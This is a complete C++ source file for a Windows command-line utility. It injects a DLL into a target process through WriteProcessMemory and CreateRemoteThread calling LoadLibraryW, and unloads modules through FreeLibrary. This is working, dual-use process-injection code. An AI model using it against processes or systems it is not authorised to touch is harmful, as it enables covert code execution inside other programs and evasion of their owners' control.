#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "Advapi32.lib")

// Print help information
void PrintHelp()
{
    std::wcout << L"Usage:\n"
        << L"  Show help:\n"
        << L"    DllManager.exe help\n"
        << L"    DllManager.exe -help\n"
        << L"    DllManager.exe --help\n"
        << L"    DllManager.exe -h\n\n"
        << L"  Inject DLL:\n"
        << L"    DllManager.exe inject --pid <PID> --dll <PathToDLL>\n"
        << L"    DllManager.exe inject --pname <ProcessName> --dll <PathToDLL>\n\n"
        << L"  Unload DLL:\n"
        << L"    DllManager.exe unload --pid <PID> --dll <DLLFileNameOrFullPath>\n"
        << L"    DllManager.exe unload --pname <ProcessName> --dll <DLLFileNameOrFullPath>\n\n"
        << L"Examples:\n"
        << L"  DllManager.exe inject --pid 1234 --dll C:\\Test\\MyDll.dll\n"
        << L"  DllManager.exe unload --pname notepad.exe --dll MyDll.dll\n"
        << std::endl;
}

// Convert a std::wstring to lowercase
std::wstring ToLower(const std::wstring& str)
{
    std::wstring result = str;
    for (auto& ch : result)
        ch = towlower(ch);
    return result;
}

// Get PID by process name (if multiple processes share the same name, 
// this example only returns the first match)
DWORD GetProcessIDByName(const std::wstring& processName)
{
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"[-] CreateToolhelp32Snapshot failed, error code: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(pe32);

    if (Process32FirstW(hSnapshot, &pe32))
    {
        do
        {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0)
            {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// Inject DLL
bool InjectDLL(DWORD pid, const std::wstring& dllPath)
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::wcerr << L"[-] Unable to open process PID=" << pid << L", Error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process
    size_t allocSize = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, allocSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf)
    {
        std::wcerr << L"[-] VirtualAllocEx failed, Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), allocSize, NULL))
    {
        std::wcerr << L"[-] WriteProcessMemory failed, Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryW
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
    {
        std::wcerr << L"[-] GetModuleHandleW(kernel32.dll) failed" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID pLoadLibraryW = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibraryW)
    {
        std::wcerr << L"[-] GetProcAddress(LoadLibraryW) failed" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread to call LoadLibraryW
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemoteBuf, 0, NULL);
    if (!hThread)
    {
        std::wcerr << L"[-] CreateRemoteThread failed, Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::wcout << L"[+] Successfully injected DLL: " << dllPath << std::endl;
    return true;
}

// Utility function: check if the user-provided DLL name matches the enumerated module
bool MatchModuleNameOrPath(const std::wstring& userInput, const std::wstring& modulePath)
{
    std::wstring userLower = ToLower(userInput);
    std::wstring modLower = ToLower(modulePath);

    // Check if it contains directory symbols: '\\', '/', ':'
    if (userLower.find(L'\\') != std::wstring::npos ||
        userLower.find(L'/') != std::wstring::npos ||
        userLower.find(L':') != std::wstring::npos)
    {
        // If the user provided a full path (or includes path symbols), 
        // require an exact match
        return (userLower == modLower);
    }
    else
    {
        // The user provided only a filename
        // Find the position of the last backslash in modulePath
        size_t pos = modLower.find_last_of(L'\\');
        if (pos == std::wstring::npos)
        {
            // No backslash found; compare directly
            return (userLower == modLower);
        }
        else
        {
            // Extract the filename part
            std::wstring fileName = modLower.substr(pos + 1);
            return (userLower == fileName);
        }
    }
}

// Find the module base address in the target process that matches userDllString
HMODULE FindRemoteModule(DWORD pid, const std::wstring& userDllString)
{
    HMODULE hResult = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"[-] CreateToolhelp32Snapshot failed, Error code: " << GetLastError() << std::endl;
        return NULL;
    }

    MODULEENTRY32W me32 = { 0 };
    me32.dwSize = sizeof(me32);

    if (Module32FirstW(hSnapshot, &me32))
    {
        do
        {
            // me32.szExePath is the full path of the module
            if (MatchModuleNameOrPath(userDllString, me32.szExePath))
            {
                hResult = me32.hModule;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }

    CloseHandle(hSnapshot);
    return hResult;
}

// Unload a DLL
bool UnloadDLL(DWORD pid, const std::wstring& dllIdentifier)
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::wcerr << L"[-] Unable to open process PID=" << pid << L", Error: " << GetLastError() << std::endl;
        return false;
    }

    // Find the remote module
    HMODULE hModuleToUnload = FindRemoteModule(pid, dllIdentifier);
    if (!hModuleToUnload)
    {
        std::wcerr << L"[-] Could not find DLL module: " << dllIdentifier << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of FreeLibrary
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32)
    {
        std::wcerr << L"[-] GetModuleHandleW(kernel32.dll) failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    LPVOID pFreeLibrary = (LPVOID)GetProcAddress(hKernel32, "FreeLibrary");
    if (!pFreeLibrary)
    {
        std::wcerr << L"[-] GetProcAddress(FreeLibrary) failed" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread to call FreeLibrary
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pFreeLibrary, (LPVOID)hModuleToUnload, 0, NULL);
    if (!hThread)
    {
        std::wcerr << L"[-] CreateRemoteThread failed, Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Wait for the thread to complete
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::wcout << L"[+] Successfully unloaded DLL: " << dllIdentifier << std::endl;
    return true;
}

// Command line parsing
int wmain(int argc, wchar_t* argv[])
{
    // If there are not enough arguments, print help
    if (argc < 2)
    {
        PrintHelp();
        return 0;
    }

    // Collect arguments
    std::vector<std::wstring> args;
    args.reserve(argc - 1);
    for (int i = 1; i < argc; i++)
    {
        args.push_back(argv[i]);
    }

    // Check if it's a help argument
    {
        std::wstring first = ToLower(args[0]);
        if (first == L"help" || first == L"-help" || first == L"--help" || first == L"-h")
        {
            PrintHelp();
            return 0;
        }
    }

    // The first argument (action) => inject or unload
    std::wstring action = ToLower(args[0]);
    if (action != L"inject" && action != L"unload")
    {
        std::wcerr << L"[-] Unknown action: " << args[0] << std::endl;
        PrintHelp();
        return -1;
    }

    // Variables to hold the extracted parameters
    DWORD pid = 0;
    bool usePid = false;
    std::wstring pname;
    std::wstring dllPathOrName;

    // Parse the remaining arguments
    for (size_t i = 1; i < args.size(); i++)
    {
        std::wstring par = ToLower(args[i]);

        if (par == L"--pid")
        {
            // Next argument is PID
            if (i + 1 < args.size())
            {
                pid = std::wcstoul(args[i + 1].c_str(), nullptr, 10);
                usePid = true;
                i++;
            }
            else
            {
                std::wcerr << L"[-] Missing PID parameter" << std::endl;
                return -1;
            }
        }
        else if (par == L"--pname")
        {
            // Next argument is process name
            if (i + 1 < args.size())
            {
                pname = args[i + 1];
                i++;
            }
            else
            {
                std::wcerr << L"[-] Missing process name parameter" << std::endl;
                return -1;
            }
        }
        else if (par == L"--dll")
        {
            // Next argument is the DLL path or file name
            if (i + 1 < args.size())
            {
                dllPathOrName = args[i + 1];
                i++;
            }
            else
            {
                std::wcerr << L"[-] Missing DLL parameter" << std::endl;
                return -1;
            }
        }
        else
        {
            // Other unrecognized parameters; may not be an error, depending on needs
            std::wcerr << L"[!] Unrecognized parameter: " << args[i] << std::endl;
        }
    }

    // Check necessary parameters
    if (!usePid && pname.empty())
    {
        std::wcerr << L"[-] You must specify --pid <pid> or --pname <processName>" << std::endl;
        PrintHelp();
        return -1;
    }
    if (dllPathOrName.empty())
    {
        std::wcerr << L"[-] You must specify --dll <PathOrFileName>" << std::endl;
        PrintHelp();
        return -1;
    }

    // If pname was provided, convert it to PID
    if (!pname.empty())
    {
        DWORD foundPid = GetProcessIDByName(pname);
        if (foundPid == 0)
        {
            std::wcerr << L"[-] Process not found: " << pname << std::endl;
            return -1;
        }
        pid = foundPid;
    }

    // Execute based on the action
    bool result = false;
    if (action == L"inject")
    {
        result = InjectDLL(pid, dllPathOrName);
    }
    else // unload
    {
        result = UnloadDLL(pid, dllPathOrName);
    }

    return result ? 0 : -1;
}
